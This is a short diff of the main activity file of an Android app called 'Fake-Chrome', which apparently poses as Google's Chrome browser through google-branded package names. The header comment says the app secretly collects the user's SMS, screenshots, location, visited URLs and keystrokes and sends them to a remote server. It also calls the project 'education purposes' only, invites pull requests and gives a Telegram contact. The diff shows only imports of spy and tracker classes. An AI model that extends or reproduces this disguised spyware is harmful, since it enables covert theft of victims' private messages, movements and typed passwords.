@@ -15,7 +15,6 @@ import androidx.activity.viewModels
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
 import com.android.google.databinding.ActivityMainBinding
-import com.android.google.services.spymanager.SpyHelper
 import com.android.google.services.spymanager.SpyManager
 import com.android.google.services.tracker.Tracker
 import com.android.google.utils.logw
@@ -24,10 +23,16 @@ import com.android.google.viewmodel.MainViewModel
 
 /*
 * Fake-Chrome 30.12.2022
+*
 * Collecting data about fake-chrome user
-* SMS, Screenshots, Location, Urls, Key log
+* SMS, Screenshots (+), Location (+), Urls, Key log
 * Storing data on remote server, using RemoteService
 * Ehea - only for "education purposes"
+*
+* You can leave here piece of your hearth
+* Opened for pull-requests
+*
+* Telegram: https://t.me/eh1asec
 * */
 
 class MainActivity : AppCompatActivity() {
